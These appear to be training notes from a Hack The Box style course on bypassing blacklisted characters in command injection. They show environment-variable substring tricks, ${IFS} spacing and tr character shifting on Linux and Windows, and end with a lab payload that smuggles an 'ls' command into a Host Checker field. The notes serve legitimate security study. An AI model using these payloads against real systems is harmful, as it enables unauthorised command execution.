
# **Command Injection – Bypassing Other Blacklisted Characters Notes**

## **1. Problem**

- Commonly blocked characters:
    
    - `/` (slash)
        
    - `\` (backslash)
        
- Needed for:
    
    - Directory paths (Linux/Windows)
        

---

## **2. Linux – Bypassing Slash `/`**

### **Concept**

- Use **environment variables**
    
- Extract specific characters using substring
    

---

### **Example: PATH variable**

```bash
echo ${PATH}
```

Output:

```
/usr/local/bin:/usr/bin:/bin:/usr/games
```

---

### **Extract `/`**

```bash
${PATH:0:1}
```

### **Result**

```
/
```

---

### **Key Idea**

- Take:
    
    - Start index = 0
        
    - Length = 1
        
- Extracts `/`
    

---

## **3. Using Environment Variable for Semicolon**

```bash
${LS_COLORS:10:1}
```

### **Result**

```
;
```

---

### **Purpose**

- Used to bypass:
    
    - Blacklisted `;`
        
- Can be used as injection operator
    

---

## **4. Payload Concept (Combining characters)**

```text
127.0.0.1${LS_COLORS:10:1}${IFS}
```

---

### **Meaning**

- `${LS_COLORS:10:1}` → `;`
    
- `${IFS}` → space
    
- Builds injection payload without using blocked characters
    

---

## **5. Windows Bypass Techniques**

### **Slash (`\`) using CMD**

The same concept works on Windows as well. For example, to produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\htb-student`), and then specify a starting position (`~6` -> `\htb-student`), and finally specifying a negative end position, which in this case is the length of the username `htb-student` (`-11` -> `\`)
- -11, remove 11 char from end.
```cmd
echo %HOMEPATH:~6,-11%
```

### **Result**

```
\
```

---

### **PowerShell alternative**

```powershell
$env:HOMEPATH[0]
```

---

### **Key Idea**

- Strings treated as arrays
    
- Characters accessed using index
    

---

## **6. Character Shifting Technique**

### **Concept**

- Use ASCII values
    
- Take previous character and shift it
    

---

### **Example**

```bash
echo $(tr '!-}' '"-~'<<<[)
```

### **Logic**

- `[` → ASCII 91
    
- `\` → ASCII 92
    
- Input `[` and shift → gives `\`
    

---

### **Result**

```
\
```

---

## **7. Windows Character Shifting Idea**

- Same concept exists but:
    
    - Longer PowerShell commands
        
- Uses:
    
    - Environment variables
        
    - Indexing

# **Question Scenario (HTB Style)**

## **Task**

- Web app blocks:
    
    - `/`
        
    - `;`
        
    - space
        
- Goal:
    
    - Inject command via Host Checker
        
    - Execute system command like `ls /home`
        

---

## **What you learned to use**

- `${PATH:0:1}` → `/`
    
- `${LS_COLORS:10:1}` → `;`
    
- `${IFS}` → space
    
- `%0a` → newline execution
    

---

## **Typical working idea**

- Build command without forbidden characters:
    

```text
127.0.0.1%0als${IFS}${PATH:0:1}home
```
